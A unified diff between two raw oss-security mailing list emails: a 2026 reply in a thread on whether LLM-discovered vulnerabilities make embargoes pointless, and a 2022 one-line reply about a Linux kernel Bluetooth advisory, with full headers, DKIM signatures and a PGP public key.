@@ -1,4 +1,4 @@
-Received: (qmail 32689 invoked by uid 550); 12 May 2026 17:53:30 -0000
+Received: (qmail 17885 invoked by uid 550); 15 Dec 2022 20:27:26 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,344 +7,592 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 28387 invoked from network); 12 May 2026 17:40:41 -0000
+Received: (qmail 15407 invoked from network); 15 Dec 2022 20:23:52 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1778607632; x=1779212432; darn=lists.openwall.com;
-        h=in-reply-to:autocrypt:from:content-language:references:to:subject
-         :user-agent:mime-version:date:message-id:from:to:cc:subject:date
-         :message-id:reply-to;
-        bh=tPGsAZh5Uq23BEjylulfn4AMv/V131xGO35WADMR5l0=;
-        b=F64NspuBCV7mkpFtv2Px+ZDRfTUq4FT/zAr6BtnOUsZ/do+gIyh6UgiNIvSIk4IKAT
-         x9JwjK1y43ioOQGySMs+9dR90CAJIhfwJCtU+AbHkh4YWNyRNjbseTw3gYfiyoRh3UOw
-         Wo6rUuez7IMXnOHEHOQzNK5m1UsUm1Kmw6WbBf2VXX03bZPixU27Ohw5E04Ss7XuxWid
-         tj3fJSLcbdvrRzlppcCCvYCP4PUM/5jacRjk23Xtt6tW/t49xF33gzJi/dzNsbEQMgL3
-         1nicUvQSpu0v9kMGwrbM8LAEDa8U/oWao6L1yjzPEP6NsG57hALHcTj2b/bu98OZfTmp
-         8s7A==
+        d=chromium.org; s=google;
+        h=cc:to:subject:message-id:date:from:in-reply-to:references
+         :mime-version:from:to:cc:subject:date:message-id:reply-to;
+        bh=5GTX8hBTujqH6SIkUW8d5QERqM/VKOe+zPT/bMUrtxY=;
+        b=nDH7bfNMJ+z7J7gnGNt3h/IukqDJp2If9OshwInGJjsmhMt2QQ9nNIqm3Ny7n14ge9
+         8lox2BdDmsFfUC2qpJo1ShO4tmCSosN6SmV17NCmForavF5EXD6lgEUdb+XgGovOyUcP
+         0vYPmoKPiWEOJWKwu/pM1uXebwMcPpVnqSNRQ=
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1778607632; x=1779212432;
-        h=in-reply-to:autocrypt:from:content-language:references:to:subject
-         :user-agent:mime-version:date:message-id:x-gm-gg:x-gm-message-state
-         :from:to:cc:subject:date:message-id:reply-to;
-        bh=tPGsAZh5Uq23BEjylulfn4AMv/V131xGO35WADMR5l0=;
-        b=kLCP3o/3DN3vWrpmI70dWPRCDMiVreh1/VlqjSI2DxslIYzFeY7O8c7J4QCv+IbcOn
-         F2LJxDwFb8wxGmpme9r9lvZ+y9+JBV9cErN6hTGcFxHVthd+/7vLSlsjzWmBjfJnx2YF
-         uucVgNxyyUHCnWxVd7ttiZ4NfEB7SdE0IN2wfdtm5MWXUI+3ALMm+EeawVYnAbu1dssB
-         rp7xMhqy+z2n5424FN5iziTsEo56egprAtx3yKYTMwlBqx6CQ+KX8cJduyEwTJy7K02C
-         xq8S37u8tYyed28t0K9+6CvgZivfKQbIFWTzhLcZeIFkpsh0V8rYSCNJkgaYO5n04Nrp
-         EJ3g==
-X-Gm-Message-State: AOJu0YxqHY+9bSqs65XDe1DslIMqgbKr/6KaDeju+K9W/yoNWEhMMr9C
-	+WDYFy+Aev7b2Qy0WtXnpfpYcC9IgW6TEo3DdIGAu3dJUGhfm6IV+Uf7xlzUFg==
-X-Gm-Gg: Acq92OFHMOe9yGwv6qDBMFISARVee5dXSWbzuPZ+eq/Kb4EncwPsfbL9xuHwYXI8LWr
-	ycmtmrqo9F8G9NbO2gqH/tLw3X22sMdtX8/uq31Z7gbDlv4TM2CCkM8J/DDJRlMbpWyYAMfQgBJ
-	TPVUYzv9LVA6Aq7E6aZMlSl70WPJSEwlcordE4g5MqYl8fMZWRLZ3xgsFWbUvaRvzw8gnB96z+5
-	gDukiW4SMCtghUUFTpDdIvXqHWbY91dsLrSJbsy1yRa62hZKJsTPWMTjqByBDZHkwsOp7B7+asc
-	cvqp49Qfd765VBsjRTqVu1X4ZFBkS/nADqcNH+JG8xpKVTWwQELM/TpNsHciu9xAQ7kFs7NnR/t
-	zXev0FiL2HjjBb7yWiQ/1ifxxP0phvWjnbLAs3rY5G6HwZq7EwkZ714UxI7HJbtT4bvy9Pkje15
-	cypWbyOFxD8WefTjGLF/6Ljt5UsJjA1kIbDn75zxz/o98xSKMu9cB4OTBwIz2ExbJGMV6lggR5u
-	omLj4licrJ9zL9026i9DW5d15pMOd4wX7R8A+n7Kw==
-X-Received: by 2002:a05:690c:f02:b0:7bd:8952:1322 with SMTP id 00721157ae682-7c510b6f728mr44899507b3.27.1778607631780;
-        Tue, 12 May 2026 10:40:31 -0700 (PDT)
-Message-ID: <1aed29dc-a3b8-46ef-9784-f147805df928@gmail.com>
-Date: Tue, 12 May 2026 13:40:16 -0400
+        d=1e100.net; s=20210112;
+        h=cc:to:subject:message-id:date:from:in-reply-to:references
+         :mime-version:x-gm-message-state:from:to:cc:subject:date:message-id
+         :reply-to;
+        bh=5GTX8hBTujqH6SIkUW8d5QERqM/VKOe+zPT/bMUrtxY=;
+        b=FA957l1VfRh8z94ddlLChTdS2Zx1qIemyuyOqtk5DW886Wu6jqObkxF6vGivcI5Ovn
+         TgAO+7FLREcB/q1SixcsodDZPBE8alva0VcsbIEt6FnJTWxHOqNVCVr1a4MGo2T7SgHe
+         I+szkt7uhM2mfJnjKV3RejT6tPCa+ixV+ITCMLGCVsifSBoIv2hRXuVZptUQSerzQAiw
+         d2A4tBjw6TrC2OOCqkClRApjmQZkojmNC6UCjAznHC3rNiUZW3hLxRilcE9PL5/6uGvR
+         2r5Gv19vBxmasB83FRNw5in7/Z3tmDy4FeBa+oFBvqhMFtOEWrik9UcpnMWG3asD8qyf
+         IJUA==
+X-Gm-Message-State: ANoB5pmdxTF540FuHRKfAAIdrUIk1LN+jaOU2sgqe8YfifJd3a0yG0tu
+	ON/CXdx5LoX5CzuU9hh0sTWUO300tXCdoC1pdTjF6fRaDYwqDHWV
+X-Google-Smtp-Source: AA0mqf6jb9xhdiiNTd8jl4EPYYDAqqY3gfIuMGDewQF9ZVtyWiTsukhJECrj3Iix7f5on483XHInxWyskriEvdFOcRg=
+X-Received: by 2002:a02:8818:0:b0:38a:5560:60db with SMTP id
+ r24-20020a028818000000b0038a556060dbmr10240555jai.117.1671135820155; Thu, 15
+ Dec 2022 12:23:40 -0800 (PST)
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-To: oss-security@lists.openwall.com, Willy Tarreau <w@1wt.eu>
-References: <afDLFWVMK-r70PB0@yuggoth.org>
- <521d0295-6a93-4a28-be55-332d663ec457@gmail.com> <afI-PPAr7EP8SEsu@1wt.eu>
-Content-Language: en-US
-From: Demi Marie Obenour <demiobenour@gmail.com>
-Autocrypt: addr=demiobenour@gmail.com; keydata=
- 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
- +MYSfkEjBz0E8CLOcAw7JIwAaeBT
-In-Reply-To: <afI-PPAr7EP8SEsu@1wt.eu>
-Content-Type: multipart/signed; micalg=pgp-sha256;
- protocol="application/pgp-signature";
- boundary="------------x1Qs2o9OIaPYDoHSrLHLdKK1"
-Subject: Re: [oss-security] Coordinated Disclosure in the LLM Age
+References: <CAFXgH+PXHvA8ueX5P2yYHWeOOdkkPjQLHnG9c1gNd53Y1Ekm1Q@mail.gmail.com>
+ <Y5o5/QBvu4SwouGl@eldamar.lan>
+In-Reply-To: <Y5o5/QBvu4SwouGl@eldamar.lan>
+From: Rafael Correa De Ysasi <rcorreadeysasi@chromium.org>
+Date: Thu, 15 Dec 2022 15:23:29 -0500
+Message-ID: <CAFXgH+MSuNdXS3sfeXB+KBPnPH9oNgN_tuk_6oRO0RSqQu3b3A@mail.gmail.com>
+To: carnil@debian.org
+Cc: oss-security@lists.openwall.com
+Content-Type: multipart/alternative; boundary="000000000000eeaff705efe3a0a7"
+Subject: Re: [oss-security] Linux Kernel: UAF in Bluetooth L2CAP Handshake
 
---------------x1Qs2o9OIaPYDoHSrLHLdKK1
-Content-Type: multipart/mixed; boundary="------------wy2BEVwOx0bMhEquSY7Ikg05";
- protected-headers="v1"
-Message-ID: <1aed29dc-a3b8-46ef-9784-f147805df928@gmail.com>
-Date: Tue, 12 May 2026 13:40:16 -0400
-MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: [oss-security] Coordinated Disclosure in the LLM Age
-To: oss-security@lists.openwall.com, Willy Tarreau <w@1wt.eu>
-References: <afDLFWVMK-r70PB0@yuggoth.org>
- <521d0295-6a93-4a28-be55-332d663ec457@gmail.com> <afI-PPAr7EP8SEsu@1wt.eu>
-Content-Language: en-US
-From: Demi Marie Obenour <demiobenour@gmail.com>
-Autocrypt: addr=demiobenour@gmail.com; keydata=
- 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
- +MYSfkEjBz0E8CLOcAw7JIwAaeBT
-In-Reply-To: <afI-PPAr7EP8SEsu@1wt.eu>
-
---------------wy2BEVwOx0bMhEquSY7Ikg05
-Content-Type: multipart/mixed; boundary="------------1HiA6wkfNwfx2L9XgtZ0eYKY"
-
---------------1HiA6wkfNwfx2L9XgtZ0eYKY
-Content-Type: text/plain; charset=UTF-8
+--000000000000eeaff705efe3a0a7
+Content-Type: text/plain; charset="UTF-8"
 Content-Transfer-Encoding: quoted-printable
 
-On 4/29/26 13:22, Willy Tarreau wrote:
-> On Tue, Apr 28, 2026 at 10:18:08PM -0500, Jacob Bachmeyer wrote:
->> On 4/28/26 09:58, Jeremy Stanley wrote:
->>> I'm sorely tempted, both due to the increased volume and the risk of
->>> premature disclosure, to just assume that any vulnerability reported as
->>> a result of research using an LLM is trivially discoverable by others,
->>> and give up trying to pretend there's any point to working it under
->>> embargo.
->>
->> You are correct here:=C2=A0 you should assume that any LLM will give a s=
-imilar
->> result to another person who asks a similar question.=C2=A0 In other wor=
-ds,
->> LLM-discovered vulnerabilities should be considered already publicly kno=
-wn.
->=20
-> I'm increasingly doing that myself already, and predicted the death of
-> embargoes a serveral months ago. Now I just remove unneeded details from
-> commit messages, merging and issue releases to keep users protected.
->=20
-> Embargoes now play against security, for all the time we don't act,
-> users stay exposed to anyone having the luck to find the same problem.
-> It's not a matter of the LLM's strength but a matter of determination
-> by the researcher who could simply run a small model several times
-> helping it dig further. Bigger models just find faster, but that only
-> counts for those seeking protection, not for those trying to attack.
+That's correct, that's part of our advisory.
 
-I wonder if some projects will abandon releases altogether and switch
-to a "use the latest commit from the dev branch" model.
---=20
-Sincerely,
-Demi Marie Obenour (she/her/hers)=
+Thanks,
 
---------------1HiA6wkfNwfx2L9XgtZ0eYKY
-Content-Type: application/pgp-keys; name="OpenPGP_0xB288B55FFF9C22C1.asc"
-Content-Disposition: attachment; filename="OpenPGP_0xB288B55FFF9C22C1.asc"
-Content-Description: OpenPGP public key
-Content-Transfer-Encoding: quoted-printable
+Rafael
 
------BEGIN PGP PUBLIC KEY BLOCK-----=0A=
-=0A=
-xsFNBFp+A0oBEADffj6anl9/BHhUSxGTICeVl2tob7hPDdhHNgPR4C8xlYt5q49y=0A=
-B+l2nipdaq+4Gk6FZfqC825TKl7eRpUjMriwle4r3R0ydSIGcy4M6eb0IcxmuPYf=0A=
-bWpr/si88QKgyGSVZ7GeNW1UnzTdhYHuFlk8dBSmB1fzhEYEk0RcJqg4AKoq6/3/=0A=
-UorR+FaSuVwT7rqzGrTlscnTDlPWgRzrQ3jssesI7sZLm82E3pJSgaUoCdCOlL7M=0A=
-MPCJwI8JpPlBedRpe9tfVyfu3euTPLPxwcV3L/cfWPGSL4PofBtB8NUU6QwYiQ9H=0A=
-zx4xOyn67zW73/G0Q2vPPRst8LBDqlxLjbtx/WLR6h3nBc3eyuZ+q62HS1pJ5EvU=0A=
-T1vjyJ1ySrqtUXWQ4XlZyoEFUfpJxJoN0A9HCxmHGVckzTRl5FMWo8TCniHynNXs=0A=
-BtDQbabt7aNEOaAJdE7to0AH3T/Bvwzcp0ZJtBk0EM6YeMLtotUut7h2Bkg1b//r=0A=
-6bTBswMBXVJ5H44Qf0+eKeUg7whSC9qpYOzzrm7+0r9F5u3qF8ZTx55TJc2g656C=0A=
-9a1P1MYVysLvkLvS4H+crmxA/i08Tc1h+x9RRvqba4lSzZ6/Tmt60DPM5Sc4R0nS=0A=
-m9BBff0Nm0bSNRS8InXdO1Aq3362QKX2NOwcL5YaStwODNyZUqF7izjK4QARAQAB=0A=
-zTxEZW1pIE9iZW5vdXIgKElUTCBFbWFpbCBLZXkpIDxhdGhlbmFAaW52aXNpYmxl=0A=
-dGhpbmdzbGFiLmNvbT7CwY4EEwEIADgWIQR2h02fEza6IlkHHHGyiLVf/5wiwQUC=0A=
-X6YJvQIbAwULCQgHAgYVCgkICwIEFgIDAQIeAQIXgAAKCRCyiLVf/5wiwWRhD/0Y=0A=
-R+YYC5Kduv/2LBgQJIygMsFiRHbR4+tWXuTFqgrxxFSlMktZ6gQrQCWe38WnOXkB=0A=
-oY6n/5lSJdfnuGd2UagZ/9dkaGMUkqt+5WshLFly4BnP7pSsWReKgMP7etRTwn3S=0A=
-zk1OwFx2lzY1EnnconPLfPBc6rWG2moA6l0WX+3WNR1B1ndqpl2hPSjT2jUCBWDV=0A=
-rGOUSX7r5f1WgtBeNYnEXPBCUUM51pFGESmfHIXQrqFDA7nBNiIVFDJTmQzuEqIy=0A=
-Jl67pKNgooij5mKzRhFKHfjLRAH4mmWZlB9UjDStAfFBAoDFHwd1HL5VQCNQdqEc=0A=
-/9lZDApqWuCPadZN+pGouqLysesIYsNxUhJ7dtWOWHl0vs7/3qkWmWun/2uOJMQh=0A=
-ra2u8nA9g91FbOobWqjrDd6x3ZJoGQf4zLqjmn/P514gb697788e573WN/MpQ5XI=0A=
-Fl7aM2d6/GJiq6LC9T2gSUW4rbPBiqOCeiUx7Kd/sVm41p9TOA7fEG4bYddCfDsN=0A=
-xaQJH6VRK3NOuBUGeL+iQEVF5Xs6Yp+U+jwvv2M5Lel3EqAYo5xXTx4ls0xaxDCu=0A=
-fudcAh8CMMqx3fguSb7Mi31WlnZpk0fDuWQVNKyDP7lYpwc4nCCGNKCj622ZSocH=0A=
-AcQmX28L8pJdLYacv9pU3jPy4fHcQYvmTavTqowGnM08RGVtaSBNYXJpZSBPYmVu=0A=
-b3VyIChsb3ZlciBvZiBjb2RpbmcpIDxkZW1pb2Jlbm91ckBnbWFpbC5jb20+wsF4=0A=
-BBMBAgAiBQJafgNKAhsDBgsJCAcDAgYVCAIJCgsEFgIDAQIeAQIXgAAKCRCyiLVf=0A=
-/5wiwYa/EACv8a2+MMou9cSCNoZBQaU+fTmyzft9hUE+0d5W2UY1RY3OsjFIzm9R=0A=
-/4SVccfsqOYLEo+S0vQMIIIqFEq3FCpXXwPzyimotps05VA8U3Bd7yseojFygOgK=0A=
-sAMOAee2RCaDDOnoJue01dfZMzzHPO/TVdp3OvnpWipfv5G1Xg96rwbhMLE3tg6N=0A=
-xwAHa31Bv4/Xq8CJOoIWvx6fcmZQpz01/lSvsYn0KrfEbTKkuUf0vM9JrCTCP2oz=0A=
-VNN5BYzqaq2M4r+jmSyeXLim922VOWqGkUEQ85BSEemqrRS06IU6NtEMsF8EWt/b=0A=
-hWjk/9GDKTcnpdJHTrMxTspExBiNrvpI2t+YPU5B/dJJAUxvmhFrbSIbdB8umBZs=0A=
-I3AMYrEmpAbh5x7jEjoskUC7uN3o9vpg1oCLS2ePDLtAtyBtbHnkA4xGD7ar8mem=0A=
-xpH9lY/i+sC6CyyIUWcUDnnagKyJP0m9ks0GLsTeOCA0bft2XA6rD6aaCnMUsndT=0A=
-ctrab42CV5XypjmC4U1rPJ8JQJUh1/3P48/8sMH+3krxpJ06KNWNFaUbaMTGiltZ=0A=
-7x9DngklSYrX0T+2G4kVXNmjaljwkoLahwLla2gUWwBSyofXdqyhQdwZsp01KXNQ=0A=
-UCyT/Pg+aDcm/E7OMV3d4lf7g/CSxiX2GSEe6BlhSz+Lmd7ZJ3g32M1ARGVtaSBN=0A=
-YXJpZSBPYmVub3VyIChJVEwgRW1haWwgS2V5KSA8ZGVtaUBpbnZpc2libGV0aGlu=0A=
-Z3NsYWIuY29tPsLBjgQTAQgAOBYhBHaHTZ8TNroiWQcccbKItV//nCLBBQJgOEV+=0A=
-AhsDBQsJCAcCBhUKCQgLAgQWAgMBAh4BAheAAAoJELKItV//nCLBKwoP/1WSnFdv=0A=
-SAD0g7fD0WlF+oi7ISFT7oqJnchFLOwVHK4Jg0e4hGn1ekWsF3Ha5tFLh4V/7UUu=0A=
-obYJpTfBAA2CckspYBqLtKGjFxcaqjjpO1I2W/jeNELVtSYuCOZICjdNGw2Hl9yH=0A=
-KRZiBkqc9u8lQcHDZKq4LIpVJj6ZQV/nxttDX90ax2No1nLLQXFbr5wb465LAPpU=0A=
-lXwunYDij7xJGye+VUASQh9datye6orZYuJvNo8Tr3mAQxxkfR46LzWgxFCPEAZJ=0A=
-5P56Nc0IMHdJZj0Uc9+1jxERhOGppp5jlLgYGK7faGB/jTV6LaRQ4Ad+xiqokDWp=0A=
-mUOZsmA+bMbtPfYjDZBz5mlyHcIRKIFpE1l3Y8F7PhJuzzMUKkJi90CYakCV4x/a=0A=
-Zs4pzk5E96c2VQx01RIEJ7fzHF7lwFdtfTS4YsLtAbQFsKayqwkGcVv2B1AHeqdo=0A=
-TMX+cgDvjd1ZganGlWA8Sv9RkNSMchn1hMuTwERTyFTr2dKPnQdA1F480+jUap41=0A=
-ClXgn227WkCIMrNhQGNyJsnwyzi5wS8rBVRQ3BOTMyvGM07j3axUOYaejEpg7wKi=0A=
-wTPZGLGH1sz5GljD/916v5+v2xLbOo5606j9dWf5/tAhbPuqrQgWv41wuKDi+dDD=0A=
-EKkODF7DHes8No+QcHTDyETMn1RYm7t0RKR4zsFNBFp+A0oBEAC9ynZI9LU+uJkM=0A=
